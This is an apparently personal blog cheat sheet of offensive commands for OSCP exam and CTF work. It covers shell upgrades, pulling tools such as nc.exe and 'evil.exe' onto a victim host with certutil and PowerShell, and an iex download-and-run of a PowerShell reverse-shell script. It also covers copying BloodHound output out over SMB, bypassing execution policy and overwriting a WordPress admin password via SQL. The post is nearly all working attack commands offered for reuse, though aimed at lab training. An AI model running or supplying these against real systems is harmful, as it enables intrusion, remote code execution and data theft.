+++
title = "Useful Commands - OSCP|CTF"
description = "Useful Commands during a CTF"
type = ["posts","post"]
tags = [
    "CTF",
    "OSCP",
    "cmd",
    "Windows",
    "Linux"
]
date = "2022-03-19"
categories = [
    "checheatsheet",
    "OSCP",
]
series = ["OSCP"]
[ author ]
  name = "d42kw01f"
+++

> Most useful commands for the OSCP Exam or a CTF.
## Linux Spawning a TTY Shell
### Python:
Python:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
Python3:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Script
```bash
/usr/bin/script -qc /bin/bash /dev/null
```

### Perl
```bash
perl —e 'exec "/bin/bash";'
```

[netsec](https://netsec.ws/?p=337)
[oscp-notes](https://fareedfauzi.gitbook.io/oscp-notes/reverse-shell/interactive-ttys-shell)

---
## File Transfer
### Host --> Machine
#### Setup `HTTP` Servers:
Python2:
```bash
python -m SimpleHTTPServer 80
```
Python3:
```bash
python3 -m http.server 80
```

#### Linux Download Commands:
`wget`
```bash
wget http://$ip/file
```
`curl`
```bash
curl http://$ip/file > file
```

#### NetCat
Set up your victim to listen for the incoming request
```bash
nc -nvlp 55555 > file
```
send the file:
```bash
nc $victimip 55555 < file
```

#### SMB
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```
to download the file use following commands:
```powershell
copy \\$myip\kali\reverse.exe C:\PrivEsc\reverse.exe
```

#### Powershell
`IWR`
```powershell
IWR -Uri http://$myip/winPEASany.exe -Outfile C:\temp\winpeas.exe
```
`webClient`
```powershell
powershell -NoLogo -Command "$webClient = new-object System.Net.WebClient; $webClient.DownloadFile('http://192.168.189.131:7777/evil.exe', '%temp%\evil.exe');
```
`System.Net.WebClient`
```powershell
powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.x/nc.exe','c:\temp\nc.exe')
```
`Start-BitsTransfer`
```powershell
powershell.exe -c (Start-BitsTransfer -Source "http://10.10.14.x/nc.exe -Destination C:\temp\nc.exe")	
```
`wget`
```powershell
powershell.exe wget "http://10.10.14.x/nc.exe" -outfile "c:\temp\nc.exe"
```
`net.webclient`
```powershell
powershell iex(new-object net.webclient).downloadstring('http://10.10.14.25/Invoke-PowerShellTcp.ps1')
```
`curtutil`
```powershell
certutil -urlcache -split -f http://192.168.189.131:7777/evil.exe evil.exe
```

[oscp-notes](https://fareedfauzi.gitbook.io/oscp-notes/others/file-transfer-methodology#certutil)

### Machine --> Host
#### SMB
On the Host start the smbserver:
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username df -password df
```

On the Machine:
set up the user:
```powershell
net use \\192.168.49.128\share /u:df df
```

copy the file:
```powershell
copy 20191018035324_BloodHound.zip \\192.168.49.128\share\
```

delete the user lastly:
```powershell
net use /d \\192.168.49.128\share
```

---

## Windows Privilege Escalation commands:
To run `PrivescCheck.ps1`:
```powershell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

To check the privilges of a Windows directory
```powershell
icacls C:\Python
```

To check further privileges that the current user has:
```powerhsell
whoami /all
```
***
## more:
### Change password in sql:

```sql
UPDATE wp_users SET user_pass = MD5('test') WHERE wp_users.user_login = "admin";
```
## common:
### `nmap`
- First 1000 ports
```bash
nmap -sC -sV 192.168.72.183 -oN nmap/mul_ports --script=vuln,default -vv --open
```
- Full nmap
```bash
nmap -p- 192.168.72.183 -oN nmap/full_ports --open -vv
```
